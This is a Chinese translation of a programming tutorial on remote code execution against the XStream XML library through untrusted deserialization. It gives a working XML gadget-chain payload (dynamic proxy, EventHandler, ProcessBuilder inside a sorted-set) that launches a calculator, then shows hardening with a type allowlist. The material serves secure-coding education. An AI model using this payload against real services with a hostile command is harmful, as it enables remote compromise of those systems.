# 使用 XStream 远程执行代码

> 原文：<https://web.archive.org/web/20220930061024/https://www.baeldung.com/java-xstream-remote-code-execution>

## 1.概观

在本教程中，我们将剖析针对 XStream XML 序列化库的远程代码执行攻击。这个漏洞属于`untrusted deserialization`类攻击。

我们将了解 XStream 何时容易受到这种攻击，攻击是如何进行的，以及如何防止这种攻击。

## 2.XStream 基础知识

在描述攻击之前，让我们回顾一些 XStream 基础知识。XStream 是一个 XML 序列化库，在 Java 类型和 XML 之间进行转换。考虑一个简单的`Person`类:

```java
public class Person {
    private String first;
    private String last;

    // standard getters and setters
}
```

让我们看看 [XStream 如何将一些`Person`实例写入 XML](/web/20220626105857/https://www.baeldung.com/xstream-serialize-object-to-xml) :

```java
XStream xstream = new XStream();
String xml = xstream.toXML(person);
```

同样， [XStream 可以将 XML 读入`Person`](/web/20220626105857/https://www.baeldung.com/xstream-deserialize-xml-to-object) 的实例:

```java
XStream xstream = new XStream();
xstream.alias("person", Person.class);
String xml = "<person><first>John</first><last>Smith</last></person>";
Person person = (Person) xstream.fromXML(xml);
```

在这两种情况下，XStream 都使用 [Java 反射](/web/20220626105857/https://www.baeldung.com/java-reflection)将`Person`类型与 XML 相互转换。攻击发生在读取 XML 的过程中。读取 XML 时，XStream 使用反射实例化 Java 类。

XStream 实例化的类由它解析的 XML 元素的名称决定。

因为我们将 XStream 配置为知道`Person`类型，所以 XStream 在解析名为“person”的 XML 元素时会实例化一个新的`Person`。

除了像`Person`这样的用户定义类型之外，XStream 还可以识别开箱即用的核心 Java 类型。例如，XStream 可以从 XML 中读取一个`Map` :

```java
String xml = "" 
    + "<map>" 
    + "  <element>" 
    + "    <string>foo</string>" 
    + "    <int>10</int>" 
    + "  </element>" 
    + "</map>";
XStream xStream = new XStream();
Map<String, Integer> map = (Map<String, Integer>) xStream.fromXML(xml); 
```

我们将看到 XStream 读取代表核心 Java 类型的 XML 的能力将如何有助于远程代码执行利用。

## 3.攻击是如何进行的

当攻击者提供最终被解释为代码的输入时，就会发生远程代码执行攻击。在这种情况下，攻击者通过提供 XML 形式的攻击代码来利用 XStream 的反序列化策略。

有了正确的类组合，XStream 最终通过 Java 反射运行攻击代码。

让我们构建一个示例攻击。

### 3.1.在`ProcessBuilder`中包含攻击代码

我们的攻击旨在启动一个新的桌面计算器进程。在 macOS 上，这是“/Applications/Calculator.app”。在 Windows 上，这是“calc.exe”。为此，我们将使用一个`ProcessBuilder.` 调用 [Java 代码来启动一个新进程](/web/20220626105857/https://www.baeldung.com/java-lang-processbuilder-api)来欺骗 XStream 运行一个新进程:

```java
new ProcessBuilder().command("executable-name-here").start();
```

读取 XML 时，XStream 只调用构造函数和设置字段。因此，攻击者没有直接的方法来调用`ProcessBuilder.start()`方法。

然而，聪明的攻击者可以使用正确的类组合来最终执行`ProcessBuilder`的`start()`方法。

安全研究员 [Dinis Cruz 在他们的博客文章](https://web.archive.org/web/20220626105857/http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html)中向我们展示了他们如何使用`Comparable`接口来调用排序集合`TreeSet.`的复制构造函数中的攻击代码。我们将在这里总结这种方法。

### 3.2.创建一个动态代理

回想一下，攻击者需要创建一个`ProcessBuilder`并调用它的 `start()`方法。为此，我们将创建一个`Comparable`的实例，其`compare`方法调用`ProcessBuilder`的`start()`方法。

**幸运的是， [Java 动态代理](/web/20220626105857/https://www.baeldung.com/java-dynamic-proxies)允许我们动态创建`Comparable`的实例`.`**

此外，Java 的`EventHandler`类为攻击者提供了可配置的`InvocationHandler`实现。**攻击者配置`EventHandler`来调用`ProcessBuilder`的`start()`方法。**

将这些组件放在一起，我们就有了一个用于`Comparable`代理的 XStream XML 表示:

```java
<dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
        <target class="java.lang.ProcessBuilder">
            <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
            </command>
        </target>
        <action>start</action>
    </handler>
</dynamic-proxy>
```

### 3.3.使用`Comparable`动态代理强制进行比较

为了强制与我们的`Comparable`代理进行比较，我们将构建一个排序集合。**让我们构建一个`TreeSet`集合来比较两个`Comparable`实例:一个`String`和我们的代理。**

我们将使用`TreeSet`的复制构造函数来构建这个集合。最后，我们有了新的`TreeSet`的 XStream XML 表示，它包含我们的代理和一个`String`:

```java
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set> 
```

最终，当 XStream 读取这个 XML 时，攻击就会发生。虽然开发人员希望 XStream 读取一个`Person`，但它却执行了攻击:

```java
String sortedSortAttack = // XML from above
XStream xstream = new XStream();
Person person = (Person) xstream.fromXML(sortedSortAttack);
```

### 3.4.攻击摘要

让我们总结一下 XStream 在反序列化这个 XML 时进行的反射调用

1.  XStream 用包含一个`String`“foo”和我们的`Comparable`代理的`Collection`调用`TreeSet`复制构造函数。
2.  `TreeSet`构造函数调用我们的`Comparable`代理的`compareTo`方法，以确定排序后的集合中项目的顺序。
3.  我们的`Comparable`动态代理将所有方法调用委托给`EventHandler`。
4.  `EventHandler`被配置为调用它所组成的`ProcessBuilder`的`start()`方法。
5.  `ProcessBuilder`派生一个新进程，运行攻击者希望执行的命令。

## 4.XStream 什么时候容易受到攻击？

当攻击者控制 XStream 读取的 XML 时，XStream 容易受到这种远程代码执行攻击。

例如，考虑一个接受 XML 输入的 REST API。如果这个 REST API 使用 XStream 来读取 XML 请求体，那么它可能容易受到远程代码执行攻击，因为攻击者控制着发送给 API 的 XML 的内容。

另一方面，只使用 XStream 读取可信 XML 的应用程序的攻击面要小得多。

例如，假设一个应用程序只使用 XStream 来读取应用程序管理员设置的 XML 配置文件。该应用程序不会暴露于 XStream 远程代码执行，因为攻击者无法控制该应用程序读取的 XML(管理员才是)。

## 5.针对远程代码执行攻击强化 XStream

幸运的是，XStream 在 1.4.7 版本中引入了一个[安全框架](https://web.archive.org/web/20220626105857/https://x-stream.github.io/security.html)。我们可以使用安全框架来强化我们的示例，防止远程代码执行攻击。**安全框架允许我们用允许实例化的类型的白名单来配置 XStream。**

这个列表将只包括基本类型和我们的`Person`类:

```java
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.addPermission(NullPermission.NULL);
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
xstream.allowTypes(new Class<?>[] { Person.class });
```

此外，XStream 用户可以考虑使用运行时应用程序自我保护(RASP)代理来强化他们的系统。RASP 代理在运行时使用[字节码插装](/web/20220626105857/https://www.baeldung.com/java-instrumentation)来自动检测和阻止攻击。这种技术比手动构建类型白名单更不容易出错。

## 6.结论

在本文中，我们学习了如何对使用 XStream 读取 XML 的应用程序进行远程代码执行攻击。因为存在这样的攻击，所以当使用 XStream 从不受信任的来源读取 XML 时，必须对其进行加固。

该漏洞的存在是因为 XStream 使用反射来实例化由攻击者的 XML 标识的 Java 类。

和往常一样，例子的代码可以在 GitHub 上找到[。](https://web.archive.org/web/20220626105857/https://github.com/eugenp/tutorials/tree/master/xstream)